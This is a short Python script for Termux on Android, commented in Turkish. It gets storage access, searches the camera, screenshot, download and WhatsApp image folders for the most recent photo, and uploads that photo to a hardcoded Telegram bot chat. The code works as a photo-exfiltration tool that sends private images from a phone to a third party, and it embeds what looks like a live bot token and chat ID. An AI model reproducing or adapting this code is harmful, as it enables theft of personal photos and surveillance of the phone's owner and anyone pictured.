import os
import requests
import time
import glob

# ✅ TELEGRAM BOT BİLGİLERİ
TELEGRAM_BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
CHAT_ID = "7561737990"

def send_telegram_photo(photo_path):
    """📷 Fotoğrafı Telegram'a gönder"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    with open(photo_path, "rb") as photo:
        files = {"photo": photo}
        data = {"chat_id": CHAT_ID}
        try:
            response = requests.post(url, files=files, data=data)
            if response.status_code == 200:
                print("✅ Fotoğraf başarıyla gönderildi!")
            else:
                print(f"❌ Telegram hata verdi: {response.json()}")
        except Exception as e:
            print(f"⚠️ Fotoğraf gönderme hatası: {e}")

# 📌 1. Termux depolama izni aç
print("🔄 Depolama izni alınıyor...")
os.system("termux-setup-storage")
time.sleep(2)  # Yetki alması için bekle

# 📌 2. DCIM klasörünü kontrol et
print("📂 DCIM Klasörü İçeriği:")
os.system("ls ~/storage/dcim")

# 📌 3. Alternatif Fotoğraf Klasörleri (Android için)
photo_dirs = [
    "/data/data/com.termux/files/home/storage/dcim",  # Galeri
    "/data/data/com.termux/files/home/storage/pictures",  # Genel resimler
    "/data/data/com.termux/files/home/storage/shared/DCIM/Camera",  # Kamera çekimleri
    "/data/data/com.termux/files/home/storage/shared/Pictures",  # WhatsApp, Instagram vb.
    "/data/data/com.termux/files/home/storage/shared/WhatsApp/Media/WhatsApp Images",  # WhatsApp resimleri
    "/data/data/com.termux/files/home/storage/shared/Screenshots",  # Ekran görüntüleri
    "/storage/emulated/0/DCIM",  # 📌 **Android'in varsayılan galeri klasörü**
    "/storage/emulated/0/Pictures",  # 📌 **Galeriye kaydedilen resimler**
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",  # 📌 **WhatsApp Resimleri**
    "/storage/emulated/0/Download",  # 📌 **İndirilen görseller**
]

# 📌 4. Galerideki en son çekilmiş fotoğrafı bul
photo_list = []
for directory in photo_dirs:
    if os.path.exists(directory):  # 📌 Eğer klasör varsa
        photo_list += sorted(
            glob.glob(f"{directory}/**/*.jpg", recursive=True) + 
            glob.glob(f"{directory}/**/*.png", recursive=True) +
            glob.glob(f"{directory}/**/*.jpeg", recursive=True),
            key=os.path.getctime,  # 📌 Dosya oluşturma tarihine göre sırala
            reverse=True  # 📌 En yeni fotoğraf en başta olsun
        )

# 📌 5. Fotoğraf varsa gönder
if photo_list:
    last_photo = photo_list[0]
    print(f"📷 Gönderilecek fotoğraf: {last_photo}")
    send_telegram_photo(last_photo)
else:
    print("⚠️ Fotoğraf bulunamadı veya erişim izni yok.")
